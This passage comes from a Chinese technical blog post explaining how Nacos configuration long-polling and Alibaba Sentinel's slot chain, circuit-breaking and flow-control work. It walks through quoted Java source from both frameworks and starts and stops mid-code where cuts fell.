.newScheduledThreadPool(Runtime.getRuntime().availableProcessors(), new ThreadFactory() {\n                @Override\n                public Thread newThread(Runnable r) {\n                    Thread t = new Thread(r);\n                    t.setName(\"com.alibaba.nacos.client.Worker.longPolling.\" + agent.getName());\n                    t.setDaemon(true);\n                    return t;\n                }\n            });\n            \n    // 每10ms执行一次 checkConfigInfo 方法\n    this.executor.scheduleWithFixedDelay(new Runnable() {\n        @Override\n        public void run() {\n            try {\n                checkConfigInfo();\n            } catch (Throwable e) {\n                LOGGER.error(\"[\" + agent.getName() + \"] [sub-check] rotate check error\", e);\n            }\n        }\n    }, 1L, 10L, TimeUnit.MILLISECONDS);\n}\n\nprivate void init(Properties properties) {\n    // 长轮询的超时时间，默认为30秒，此参数会被放到请求头中带到服务端，服务端会根据该参数去做长轮询的hold\n    timeout = Math.max(ConvertUtils.toInt(properties.getProperty(PropertyKeyConst.CONFIG_LONG_POLL_TIMEOUT),\n            Constants.CONFIG_LONG_POLL_TIMEOUT), Constants.MIN_CONFIG_LONG_POLL_TIMEOUT);\n    \n    taskPenaltyTime = ConvertUtils\n            .toInt(properties.getProperty(PropertyKeyConst.CONFIG_RETRY_TIME), Constants.CONFIG_RETRY_TIME);\n    \n    this.enableRemoteSyncConfig = Boolean\n            .parseBoolean(properties.getProperty(PropertyKeyConst.ENABLE_REMOTE_SYNC_CONFIG));\n}\n\n/**\n * Check config info.\n */\npublic void checkConfigInfo() {\n    // Dispatch taskes.\n    // 获取需要监听的文件数量\n    int listenerSize = cacheMap.size();\n    // Round up the longingTaskCount.\n    // 默认一个 LongPollingRunnable 可以处理监听3k个配置文件的变化，超过3k个才会创建新的 LongPollingRunnable\n    int longingTaskCount = (int) Math.ceil(listenerSize / ParamUtil.getPerTaskConfigSize());\n    if (longingTaskCount > currentLongingTaskCount) {\n        for (int i = (int) currentLongingTaskCount; i < longingTaskCount; i++) {\n            // The task list is no order.So it maybe has issues when changing.\n            executorService.execute(new LongPollingRunnable(i));\n        }\n        currentLongingTaskCount = longingTaskCount;\n    }\n}\n```\nLongPollingRunnable 类主要用于检查本地配置，以及长轮询地去服务端获取变更配置的 dataid 和 group，其代码位于 com.alibaba.nacos.client.config.impl.ClientWorker 类，代码如下：\n```java\nclass LongPollingRunnable implements Runnable {\n    \n    private final int taskId;\n    \n    public LongPollingRunnable(int taskId) {\n        this.taskId = taskId;\n    }\n    \n    @Override\n    public void run() {\n        \n        List<CacheData> cacheDatas = new ArrayList<CacheData>();\n        List<String> inInitializingCacheList = new ArrayList<String>();\n        try {\n            // check failover config\n            // 遍历本地缓存的配置\n            for (CacheData cacheData : cacheMap.values()) {\n                if (cacheData.getTaskId() == taskId) {\n                    cacheDatas.add(cacheData);\n                    try {\n                        // 检查本地配置\n                        checkLocalConfig(cacheData);\n                        if (cacheData.isUseLocalConfigInfo()) {\n                            cacheData.checkListenerMd5();\n                        }\n                    } catch (Exception e) {\n                        LOGGER.error(\"get local config info error\", e);\n                    }\n                }\n            }\n            \n            // check server config\n            // 通过长轮询检查服务端配置\n            List<String> changedGroupKeys = checkUpdateDataIds(cacheDatas, inInitializingCacheList);\n            if (!CollectionUtils.isEmpty(changedGroupKeys)) {\n                LOGGER.info(\"get changedGroupKeys:\" + changedGroupKeys);\n            }\n            \n            for (String groupKey : changedGroupKeys) {\n                String[] key = GroupKey.parseKey(groupKey);\n                String dataId = key[0];\n                String group = key[1];\n                String tenant = null;\n                if (key.length == 3) {\n                    tenant = key[2];\n                }\n                try {\n                    String[] ct = getServerConfig(dataId, group, tenant, 3000L);\n                    CacheData cache = cacheMap.get(GroupKey.getKeyTenant(dataId, group, tenant));\n                    cache.setContent(ct[0]);\n                    if (null != ct[1]) {\n                        cache.setType(ct[1]);\n                    }\n                    LOGGER.info(\"[{}] [data-received] dataId={}, group={}, tenant={}, md5={}, content={}, type={}\",\n                            agent.getName(), dataId, group, tenant, cache.getMd5(),\n                            ContentUtils.truncateContent(ct[0]), ct[1]);\n                } catch (NacosException ioe) {\n                    String message = String\n                            .format(\"[%s] [get-update] get changed config exception. dataId=%s, group=%s, tenant=%s\",\n                                    agent.getName(), dataId, group, tenant);\n                    LOGGER.error(message, ioe);\n                }\n            }\n            for (CacheData cacheData : cacheDatas) {\n                if (!cacheData.isInitializing() || inInitializingCacheList\n                        .contains(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant))) {\n                    cacheData.checkListenerMd5();\n                    cacheData.setInitializing(false);\n                }\n            }\n            inInitializingCacheList.clear();\n            \n            executorService.execute(this);\n            \n        } catch (Throwable e) {\n            \n            // If the rotation training task is abnormal, the next execution time of the task will be punished\n            LOGGER.error(\"longPolling error : \", e);\n            executorService.schedule(this, taskPenaltyTime, TimeUnit.MILLISECONDS);\n        }\n    }\n}\n```\n上面有个 checkUpdateDataIds 方法，用于获取发生变更了的配置文件的dataId列表，它同样位于 ClientWorker 内。如下：\n```java\n/**\n * Fetch the dataId list from server.\n *\n * @param cacheDatas              CacheDatas for config infomations.\n * @param inInitializingCacheList initial cache lists.\n * @return String include dataId and group (ps: it maybe null).\n * @throws Exception Exception.\n */\nList<String> checkUpdateDataIds(List<CacheData> cacheDatas, List<String> inInitializingCacheList) throws Exception {\n    // 拼接出配置文件的唯一标识\n    StringBuilder sb = new StringBuilder();\n    for (CacheData cacheData : cacheDatas) {\n        if (!cacheData.isUseLocalConfigInfo()) {\n            sb.append(cacheData.dataId).append(WORD_SEPARATOR);\n            sb.append(cacheData.group).append(WORD_SEPARATOR);\n            if (StringUtils.isBlank(cacheData.tenant)) {\n                sb.append(cacheData.getMd5()).append(LINE_SEPARATOR);\n            } else {\n                sb.append(cacheData.getMd5()).append(WORD_SEPARATOR);\n                sb.append(cacheData.getTenant()).append(LINE_SEPARATOR);\n            }\n            if (cacheData.isInitializing()) {\n                // It updates when cacheData occours in cacheMap by first time.\n                inInitializingCacheList\n                        .add(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant));\n            }\n        }\n    }\n    boolean isInitializingCacheList = !inInitializingCacheList.isEmpty();\n    return checkUpdateConfigStr(sb.toString(), isInitializingCacheList);\n}\n\n/**\n * Fetch the updated dataId list from server.\n *\n * @param probeUpdateString       updated attribute string value.\n * @param isInitializingCacheList initial cache lists.\n * @return The updated dataId list(ps: it maybe null).\n * @throws IOException Exception.\n */\nList<String> checkUpdateConfigStr(String probeUpdateString, boolean isInitializingCacheList) throws Exception {\n    \n    Map<String, String> params = new HashMap<String, String>(2);\n    params.put(Constants.PROBE_MODIFY_REQUEST, probeUpdateString);\n    Map<String, String> headers = new HashMap<String, String>(2);\n    // 长轮询的超时时间\n    headers.put(\"Long-Pulling-Timeout\", \"\" + timeout);\n    \n    // told server do not hang me up if new initializing cacheData added in\n    if (isInitializingCacheList) {\n        headers.put(\"Long-Pulling-Timeout-No-Hangup\", \"true\");\n    }\n    \n    if (StringUtils.isBlank(probeUpdateString)) {\n        return Collections.emptyList();\n    }\n    \n    try {\n        // In order to prevent the server from handling the delay of the client's long task,\n        // increase the client's read timeout to avoid this problem.\n        \n        long readTimeoutMs = timeout + (long) Math.round(timeout >> 1);\n        // 向服务端发起一个http请求，该请求在服务端配置没有变更的情况下默认会hang住30s\n        HttpRestResult<String> result = agent\n                .httpPost(Constants.CONFIG_CONTROLLER_PATH + \"/listener\", headers, params, agent.getEncode(),\n                        readTimeoutMs);\n        \n        if (result.ok()) {\n            setHealthServer(true);\n            // 响应状态是成功则解析响应体得到 dataId、group、tenant 等信息并返回\n            return parseUpdateDataIdResponse(result.getData());\n        } else {\n            setHealthServer(false);\n            LOGGER.error(\"[{}] [check-update] get changed dataId error, code: {}\", agent.getName(),\n                    result.getCode());\n        }\n    } catch (Exception e) {\n        setHealthServer(false);\n        LOGGER.error(\"[\" + agent.getName() + \"] [check-update] get changed dataId exception\", e);\n        throw e;\n    }\n    return Collections.emptyList();\n}\n```\n客户端对 listener 接口的请求会进入到服务端的 com.alibaba.nacos.config.server.controller.ConfigController#listener 方法进行处理，该方法主要是调用了 com.alibaba.nacos.config.server.controller.ConfigServletInner#doPollingConfig 方法。代码如下：\n```java\n/**\n * 轮询接口\n */\npublic String doPollingConfig(HttpServletRequest request, HttpServletResponse response,\n                              Map<String, String> clientMd5Map, int probeRequestSize)\n    throws IOException, ServletException {\n\n    // 如果支持长轮询则进入长轮询的流程\n    if (LongPollingService.isSupportLongPolling(request)) {\n        longPollingService.addLongPollingClient(request, response, clientMd5Map, probeRequestSize);\n        return HttpServletResponse.SC_OK + \"\";\n    }\n\n    // else 兼容短轮询逻辑\n    List<String> changedGroups = MD5Util.compareMd5(request, response, clientMd5Map);\n\n    // 兼容短轮询result\n    String oldResult = MD5Util.compareMd5OldResult(changedGroups);\n    String newResult = MD5Util.compareMd5ResultString(changedGroups);\n\n    String version = request.getHeader(Constants.CLIENT_VERSION_HEADER);\n    if (version == null) {\n        version = \"2.0.0\";\n    }\n    int versionNum = Protocol.getVersionNumber(version);\n\n    /**\n     * 2.0.4版本以前, 返回值放入header中\n     */\n    if (versionNum < START_LONGPOLLING_VERSION_NUM) {\n        response.addHeader(Constants.PROBE_MODIFY_RESPONSE, oldResult);\n        response.addHeader(Constants.PROBE_MODIFY_RESPONSE_NEW, newResult);\n    } else {\n        request.setAttribute(\"content\", newResult);\n    }\n\n    // 禁用缓存\n    response.setHeader(\"Pragma\", \"no-cache\");\n    response.setDateHeader(\"Expires\", 0);\n    response.setHeader(\"Cache-Control\", \"no-cache,no-store\");\n    response.setStatus(HttpServletResponse.SC_OK);\n    return HttpServletResponse.SC_OK + \"\";\n}\n```\n我们主要关注上面的 com.alibaba.nacos.config.server.service.LongPollingService#addLongPollingClient 长轮询流程的方法。代码如下：\n```java\npublic void addLongPollingClient(HttpServletRequest req, HttpServletResponse rsp, Map<String, String> clientMd5Map,\n                                 int probeRequestSize) {\n\n    String str = req.getHeader(LongPollingService.LONG_POLLING_HEADER);\n    String noHangUpFlag = req.getHeader(LongPollingService.LONG_POLLING_NO_HANG_UP_HEADER);\n    String appName = req.getHeader(RequestUtil.CLIENT_APPNAME_HEADER);\n    String tag = req.getHeader(\"Vipserver-Tag\");\n    int delayTime = SwitchService.getSwitchInteger(SwitchService.FIXED_DELAY_TIME, 500);\n    /**\n     * 提前500ms返回响应，为避免客户端超时 @qiaoyi.dingqy 2013.10.22改动  add delay time for LoadBalance\n     */\n    long timeout = Math.max(10000, Long.parseLong(str) - delayTime);\n    if (isFixedPolling()) {\n        timeout = Math.max(10000, getFixedPollingInterval());\n        // do nothing but set fix polling timeout\n    } else {\n        long start = System.currentTimeMillis();\n        List<String> changedGroups = MD5Util.compareMd5(req, rsp, clientMd5Map);\n        if (changedGroups.size() > 0) {\n            generateResponse(req, rsp, changedGroups);\n            LogUtil.clientLog.info(\"{}|{}|{}|{}|{}|{}|{}\",\n                System.currentTimeMillis() - start, \"instant\", RequestUtil.getRemoteIp(req), \"polling\",\n                clientMd5Map.size(), probeRequestSize, changedGroups.size());\n            return;\n        } else if (noHangUpFlag != null && noHangUpFlag.equalsIgnoreCase(TRUE_STR)) {\n            LogUtil.clientLog.info(\"{}|{}|{}|{}|{}|{}|{}\", System.currentTimeMillis() - start, \"nohangup\",\n                RequestUtil.getRemoteIp(req), \"polling\", clientMd5Map.size(), probeRequestSize,\n                changedGroups.size());\n            return;\n        }\n    }\n    String ip = RequestUtil.getRemoteIp(req);\n    // 一定要由HTTP线程调用，否则离开后容器会立即发送响应\n    final AsyncContext asyncContext = req.startAsync();\n    // AsyncContext.setTimeout()的超时时间不准，所以只能自己控制\n    asyncContext.setTimeout(0L);\n\t\n\t// 在 ClientLongPolling 的 run 方法会将 ClientLongPolling 实例（携带了本次请求的相关信息）放入 allSubs 中，然后会在29.5s后再执行另一个 Runnable，该 Runnable 用于等待29.5s后依旧没有相应的配置变更时对客户端进行响应，并将相应的 ClientLongPolling 实例从 allSubs 中移出\n    scheduler.execute(\n        new ClientLongPolling(asyncContext, clientMd5Map, ip, probeRequestSize, timeout, appName, tag));\n}\n```\n而 LongPollingService 实现了 AbstractEventListener，也就是说能接收事件通知，在其 com.alibaba.nacos.config.server.service.LongPollingService#onEvent 方法中可以看到，它关注的是 LocalDataChangeEvent 事件：\n```java\n@Override\npublic void onEvent(Event event) {\n    if (isFixedPolling()) {\n        // ignore\n    } else {\n        if (event instanceof LocalDataChangeEvent) {\n            LocalDataChangeEvent evt = (LocalDataChangeEvent)event;\n            scheduler.execute(new DataChangeTask(evt.groupKey, evt.isBeta, evt.betaIps));\n        }\n    }\n}\n```\n在nacos上修改配置后就会产生 LocalDataChangeEvent 事件，此时 LongPollingService 也就能监听到，当收到该事件时就会遍历 allSubs，找到匹配的请求并将 groupKey 返回给客户端。具体代码在 DataChangeTask 中：\n```java\nclass DataChangeTask implements Runnable {\n    @Override\n    public void run() {\n        try {\n            ConfigService.getContentBetaMd5(groupKey);\n            for (Iterator<ClientLongPolling> iter = allSubs.iterator(); iter.hasNext(); ) {\n                ClientLongPolling clientSub = iter.next();\n                if (clientSub.clientMd5Map.containsKey(groupKey)) {\n                    // 如果beta发布且不在beta列表直接跳过\n                    if (isBeta && !betaIps.contains(clientSub.ip)) {\n                        continue;\n                    }\n\n                    // 如果tag发布且不在tag列表直接跳过\n                    if (StringUtils.isNotBlank(tag) && !tag.equals(clientSub.tag)) {\n                        continue;\n                    }\n\n                    getRetainIps().put(clientSub.ip, System.currentTimeMillis());\n                    iter.remove(); // 删除订阅关系\n                    LogUtil.clientLog.info(\"{}|{}|{}|{}|{}|{}|{}\",\n                        (System.currentTimeMillis() - changeTime),\n                        \"in-advance\",\n                        RequestUtil.getRemoteIp((HttpServletRequest)clientSub.asyncContext.getRequest()),\n                        \"polling\",\n                        clientSub.clientMd5Map.size(), clientSub.probeRequestSize, groupKey);\n                    clientSub.sendResponse(Arrays.asList(groupKey));\n                }\n            }\n        } catch (Throwable t) {\n            LogUtil.defaultLog.error(\"data change error:\" + t.getMessage(), t.getCause());\n        }\n    }\n\n    DataChangeTask(String groupKey) {\n        this(groupKey, false, null);\n    }\n\n    DataChangeTask(String groupKey, boolean isBeta, List<String> betaIps) {\n        this(groupKey, isBeta, betaIps, null);\n    }\n\n    DataChangeTask(String groupKey, boolean isBeta, List<String> betaIps, String tag) {\n        this.groupKey = groupKey;\n        this.isBeta = isBeta;\n        this.betaIps = betaIps;\n        this.tag = tag;\n    }\n\n    final String groupKey;\n    final long changeTime = System.currentTimeMillis();\n    final boolean isBeta;\n    final List<String> betaIps;\n    final String tag;\n}\n```\n当客户端收到变更的dataid+group后，就会去服务端获取最新的配置数据，并更新本地数据 cacheData，然后发送数据变更事件，整个流程结束。\n\n- 获取服务端最新配置数据的方法：com.alibaba.nacos.client.config.impl.ClientWorker#getServerConfig\n- 发送数据变更事件的方法：com.alibaba.nacos.client.config.impl.CacheData#checkListenerMd5\n\n## Sentienl\nSentinel是阿里巴巴开源的一款流量控制和熔断降级框架，主要用于微服务架构中服务的流量控制和熔断降级。其限流实现原理主要分为两个部分：\n\n> 统计信息收集\n\nSentinel会在运行过程中对服务的各种统计信息进行收集，包括请求的响应时间、请求通过的QPS（每秒查询率）、线程池队列大小等指标。这些指标通过定义的规则进行分析，判断当前请求是否超过了设定的阈值。\n\n> 阈值判断\n\nSentinel根据收集到的统计信息，通过定义的规则对请求进行判断。规则中包括以下几个要素：\n\n资源名：对哪个资源进行限流\n流控模式：直接拒绝或者匀速通过\n流控阈值：单位时间内允许通过的请求个数\n统计时间窗口：多长时间内统计一次流量，单位秒\n降级处理：当请求超过阈值时的处理策略，如直接拒绝、返回默认值等\nSentinel会根据以上规则进行限流，当请求超过阈值时，根据设置的降级处理策略进行处理，比如直接拒绝请求、返回默认值等。同时，Sentinel还可以进行自适应的流控，根据实际情况调整阈值，保证服务的可用性和稳定性。\n\n### 工作原理\n#### Slot 插槽\n在 Sentinel 里面，所有的资源都对应一个资源名称（resourceName），每次资源调用都会创建一个 Entry 对象。Entry 可以通过对主流框架的适配自动创建，也可以通过注解的方式或调用 SphU API 显式创建。Entry 创建的时候，同时也会创建一系列功能插槽（slot chain），这些插槽有不同的职责，例如:\n\n- NodeSelectorSlot 负责收集资源的路径，并将这些资源的调用路径，以树状结构存储起来，用于根据调用路径来限流降级；\n- ClusterBuilderSlot 则用于存储资源的统计信息以及调用者信息，例如该资源的 RT, QPS, thread count 等等，这些信息将用作为多维度限流，降级的依据；\n- StatisticSlot 则用于记录、统计不同纬度的 runtime 指标监控信息；\n- FlowSlot 则用于根据预设的限流规则以及前面 slot 统计的状态，来进行流量控制；\n- AuthoritySlot 则根据配置的黑白名单和调用来源信息，来做黑白名单控制；\n- DegradeSlot 则通过统计信息以及预设的规则，来做熔断降级；\n- SystemSlot 则通过系统的状态，例如 load1 等，来控制总的入口流量；\n\nSentinel 提供了插槽接口 ProcessorSlot，其中提供了方法 enrty 处理进入请求 和 exit 处理请求结束操作\n```java\npublic interface ProcessorSlot<T> {\n \n    /**\n     * Entrance of this slot.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param param           generics parameter, usually is a {@link com.alibaba.csp.sentinel.node.Node}\n     * @param count           tokens needed\n     * @param prioritized     whether the entry is prioritized\n     * @param args            parameters of the original call\n     * @throws Throwable blocked exception or unexpected error\n     */\n    void entry(Context context, ResourceWrapper resourceWrapper, T param, int count, boolean prioritized,\n               Object... args) throws Throwable;\n \n    /**\n     * Means finish of {@link #entry(Context, ResourceWrapper, Object, int, boolean, Object...)}.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param obj             relevant object (e.g. Node)\n     * @param count           tokens needed\n     * @param prioritized     whether the entry is prioritized\n     * @param args            parameters of the original call\n     * @throws Throwable blocked exception or unexpected error\n     */\n    void fireEntry(Context context, ResourceWrapper resourceWrapper, Object obj, int count, boolean prioritized,\n                   Object... args) throws Throwable;\n \n    /**\n     * Exit of this slot.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param count           tokens needed\n     * @param args            parameters of the original call\n     */\n    void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args);\n \n    /**\n     * Means finish of {@link #exit(Context, ResourceWrapper, int, Object...)}.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param count           tokens needed\n     * @param args            parameters of the original call\n     */\n    void fireExit(Context context, ResourceWrapper resourceWrapper, int count, Object... args);\n}\n```\n总体的框架如下:\n\n![结构图](./2024/05/26/Springcloud最热点面试题/3.png)\n\nSentinel 将 SlotChainBuilder 作为 SPI 接口进行扩展，使得 Slot Chain 具备了扩展的能力。您可以自行加入自定义的 slot 并编排 slot 间的顺序，从而可以给 Sentinel 添加自定义的功能。\n\n![Sentinel图](./2024/05/26/Springcloud最热点面试题/4.png)\n\n#### RuleManager 规则管理器\n每个 Slot 插槽背后都对应着一个 RuleManager 的实现类，简单理解就是每个 Slot 有一套规则，规则验证处理由对应的 RuleManager 来进行处理。\n\n流量控制：FlowSolt 对应 FlowRuleManager\n\n降级控制：DegradeSlot  对应 DegradeRuleManager\n\n权限控制：AuthoritySlot 对应 AuthorityRuleManager\n\n系统规则控制： SystemSlot 对应 SystemRuleManager\n\n#### 降级控制实现原理\n1. 新增资源配置降级规则，目前对于降级策有如下三种：\n\nRT：平均响应时间 (DEGRADE_GRADE_RT)：当 1s 内持续进入 5 个请求，对应时刻的平均响应时间（秒级）均超过阈值（count，以 ms 为单位），那么在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 DegradeException）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，超出此阈值的都会算作 4900 ms，若需要变更此上限可以通过启动配置项 -Dcsp.sentinel.statistic.max.rt=xxx 来配置。\n\n![平均响应图](./2024/05/26/Springcloud最热点面试题/5.png)\n\n异常比例：当资源的每秒请求量 >= 5，并且每秒异常总数占通过量的比值超过阈值（DegradeRule 中的 count）之后，资源进入降级状态，即在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。\n\n![异常比例图](./2024/05/26/Springcloud最热点面试题/6.png)\n\n异常数：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 timeWindow 小于 60s，则结束熔断状态后仍可能再进入熔断状态。\n\n![异常数图](./2024/05/26/Springcloud最热点面试题/7.png)\n\n限流结果信息\n\n```text\nBlocked by Sentinel (flow limiting)\n```\n\n2. 实现逻辑\n\n在之前我们已经提及 Sentinel 是通过 slot 链来实现的，对于降级功能其提供了 DegradeSlot，实现源码如下：\n```java\npublic class DegradeSlot extends AbstractLinkedProcessorSlot<DefaultNode> {\n \n    @Override\n    public void entry(Context context, ResourceWrapper resourceWrapper, DefaultNode node, int count, boolean prioritized, Object... args)\n        throws Throwable {\n        DegradeRuleManager.checkDegrade(resourceWrapper, context, node, count);\n        fireEntry(context, resourceWrapper, node, count, prioritized, args);\n    }\n \n    @Override\n    public void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args) {\n        fireExit(context, resourceWrapper, count, args);\n    }\n}\n```\n通过上面代码我们可以了解到，限流规则的实现是在 DegradeRuleManager 的checkDegrade中来处理的，限流可以-配置多个规则，依次按照规则来处理。\n```java\npublic static void checkDegrade(ResourceWrapper resource, Context context, DefaultNode node, int count)\n        throws BlockException {\n \n        Set<DegradeRule> rules = degradeRules.get(resource.getName());\n        if (rules == null) {\n            return;\n        }\n \n        for (DegradeRule rule : rules) {\n            if (!rule.passCheck(context, node, count)) {\n                throw new DegradeException(rule.getLimitApp(), rule);\n            }\n        }\n    }\n```\n在 DegradeRule 的 passCheck 方法中我们可以看到可以根据 RT、异常数和异常比例来进行熔断降级处理。\n```java\n@Override\n    public boolean passCheck(Context context, DefaultNode node, int acquireCount, Object... args) {\n        if (cut.get()) {\n            return false;\n        }\n \n        ClusterNode clusterNode = ClusterBuilderSlot.getClusterNode(this.getResource());\n        if (clusterNode == null) {\n            return true;\n        }\n \n\t\t// 请求处理时间\n        if (grade == RuleConstant.DEGRADE_GRADE_RT) {\n            double rt = clusterNode.avgRt();\n            if (rt < this.count) {\n                passCount.set(0);\n                return true;\n            }\n \n            // Sentinel will degrade the service only if count exceeds.\n            if (passCount.incrementAndGet() < rtSlowRequestAmount) {\n                return true;\n            }\n        } else if (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_RATIO) {\n\t\t\t//异常比例\n            double exception = clusterNode.exceptionQps();\n            double success = clusterNode.successQps();\n            double total = clusterNode.totalQps();\n            // If total amount is less than minRequestAmount, the request will pass.\n            if (total < minRequestAmount) {\n                return true;\n            }\n \n            // In the same aligned statistic time window,\n            // \"success\" (aka. completed count) = exception count + non-exception count (realSuccess)\n            double realSuccess = success - exception;\n            if (realSuccess <= 0 && exception < minRequestAmount) {\n                return true;\n            }\n \n            if (exception / success < count) {\n                return true;\n            }\n        } else if (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_COUNT) {\n\t\t\t//异常数\n            double exception = clusterNode.totalException();\n            if (exception < count) {\n                return true;\n            }\n        }\n \n        if (cut.compareAndSet(false, true)) {\n            ResetTask resetTask = new ResetTask(this);\n            pool.schedule(resetTask, timeWindow, TimeUnit.SECONDS);\n        }\n \n        return false;\n    }\n```\n\n#### 流量控制实现原理\n接下来我们了解学习一下 Sentinel 是如何实现流量控制的\n\n流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。\n\nFlowSlot 会根据预设的规则，结合前面 NodeSelectorSlot、ClusterNodeBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。\n\n限流的直接表现是在执行 Entry nodeA = SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，您可以捕捉 BlockException 来自定义被限流之后的处理逻辑。\n\n同一个资源可以创建多条限流规则。FlowSlot 会对该资源的所有限流规则依次遍历，直到有规则触发限流或者所有规则遍历完毕。\n\n一条限流规则主要由下面几个因素组成，我们可以组合这些元素来实现不同的限流效果：\n\n- resource：资源名，即限流规则的作用对象\n- count: 限流阈值\n- grade: 限流阈值类型（QPS 或并发线程数）\n- limitApp: 流控针对的调用来源，若为 default 则不区分调用来源\n- strategy: 调用关系限流策略\n- controlBehavior: 流量控制效果（直接拒绝、Warm Up、匀速排队）\n\n流控-QPS配置\n\n![QPS配置图](./2024/05/26/Springcloud最热点面试题/8.png)\n\n流控-线程数配置\n\n![流控图](./2024/05/26/Springcloud最热点面试题/9.png)\n\n##### 实现流程\nSentinel 提供了 FlowSlot 用来进行流量控制，流量规则的最终实现在 FlowRuleChecker 的 checkFlow 中实现的。\n```java\npublic class FlowSlot extends AbstractLinkedProcessorSlot<DefaultNode> {\n \n    private final FlowRuleChecker checker;\n \n    public FlowSlot() {\n        this(new FlowRuleChecker());\n    }\n \n    /**\n     * Package-private for test.\n     *\n     * @param checker flow rule checker\n     * @since 1.6.1\n     */\n    FlowSlot(FlowRuleChecker checker) {\n        AssertUtil.notNull(checker, \"flow checker should not be null\");\n        this.checker = checker;\n    }\n \n    @Override\n    public void entry(Context context, ResourceWrapper resourceWrapper, DefaultNode node, int count,\n                      boolean prioritized, Object... args) throws Throwable {\n        checkFlow(resourceWrapper, context, node, count, prioritized);\n \n        fireEntry(context, resourceWrapper, node, count, prioritized, args);\n    }\n \n    void checkFlow(ResourceWrapper resource, Context context, DefaultNode node, int count, boolean prioritized)\n        throws BlockException {\n        checker.checkFlow(ruleProvider, resource, context, node, count, prioritized);\n    }\n \n    @Override\n    public void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args) {\n        fireExit(context, resourceWrapper, count, args);\n    }\n \n    private final Function<String, Collection<FlowRule>> ruleProvider = new Function<String, Collection<FlowRule>>() {\n        @Override\n        public Collection<FlowRule> apply(String resource) {\n            // Flow rule map should not be null.\n            Map<String, List<FlowRule>> flowRules = FlowRuleManager.getFlowRuleMap();\n            return flowRules.get(resource);\n        }\n    };\n}\n```\n在 checkFlow 中会依次获取我们配置的流控规则，然后依次进行流控判断处理，如果被流控则抛出异常 FlowException\n```java\npublic void checkFlow(Function<String, Collection<FlowRule>> ruleProvider, ResourceWrapper resource,\n                          Context context, DefaultNode node, int count, boolean prioritized) throws BlockException {\n        if (ruleProvider == null || resource == null) {\n            return;\n        }\n        Collection<FlowRule> rules = ruleProvider.apply(resource.getName());\n        if (rules != null) {\n            for (FlowRule rule : rules) {\n                if (!canPassCheck(rule, context, node, count, prioritized)) {\n                    throw new FlowException(rule.getLimitApp(), rule);\n                }\n            }\n        }\n    }\n```\n在 canPassCheck 中会判断是集群限流还是本地限流\n```java\npublic boolean canPassCheck(/*@NonNull*/ FlowRule rule, Context context, DefaultNode node, int acquireCount,\n                                                    boolean prioritized) {\n        String limitApp = rule.getLimitApp();\n        if (limitApp == null) {\n            return true;\n        }\n \n        if (rule.isClusterMode()) {\n            return passClusterCheck(rule, context, node, acquireCount, prioritized);\n        }\n \n        return passLocalCheck(rule, context, node, acquireCount, prioritized);\n    }\n```\n如果是本地限流则获取节点信息，然后根据流控规则进行流控判断\n```java\nprivate static boolean passLocalCheck(FlowRule rule, Context context, DefaultNode node, int acquireCount,\n                                          boolean prioritized) {\n        Node selectedNode = selectNodeByRequesterAndStrategy(rule, context, node);\n        if (selectedNode == null) {\n            return true;\n        }\n \n        return rule.getRater().canPass(selectedNode, acquireCount, prioritized);\n    }\n```\n当 QPS 超过某个阈值的时候，则采取措施进行流量控制。流量控制的手段包括以下几种：直接拒绝、Warm Up、匀速排队。对应 FlowRule 中的 controlBehavior 字段。\n\n直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当QPS超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException。这种方式适用于对系统处理能力确切已知的情况下，比如通过压测确定了系统的准确水位时。具体的例子参见 FlowQpsDemo。\n\nWarm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热/冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过\"冷启动\"，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。详细文档可以参考 流量控制 - Warm Up 文档\n\n目前 Sentinel 对于流量控制提供了如下几种方式：\n\n- 直接拒绝（DefaultController）：支持抛出异常\n```java\n    @Override\n    public boolean canPass(Node node, int acquireCount, boolean prioritized) {\n        int curCount = avgUsedTokens(node);\n        if (curCount + acquireCount > count) {\n            if (prioritized && grade == RuleConstant.FLOW_GRADE_QPS) {\n                long currentTime;\n                long waitInMs;\n                currentTime = TimeUtil.currentTimeMillis();\n                waitInMs = node.tryOccupyNext(currentTime, acquireCount, count);\n                if (waitInMs < OccupyTimeoutProperty.getOccupyTimeout()) {\n                    node.addWaitingRequest(currentTime + waitInMs, acquireCount);\n                    node.addOccupiedPass(acquireCount);\n                    sleep(waitInMs);\n \n                    // PriorityWaitException indicates that the request will pass after waiting for {@link @waitInMs}.\n                    throw new PriorityWaitException(waitInMs);\n                }\n            }\n            return false;\n        }\n        return true;\n    }\n```\n- 匀速排队（RateLimiterController）：判断等待时间，如果等待时间过长也是会限流，并且使用 Thread.sleep 如果配置不正确可能会导致线程过多。\n```java\n@Override\n    public boolean canPass(Node node, int acquireCount, boolean prioritized) {\n        // Pass when acquire count is less or equal than 0.\n        if (acquireCount <= 0) {\n            return true;\n        }\n        // Reject when count is less or equal than 0.\n        // 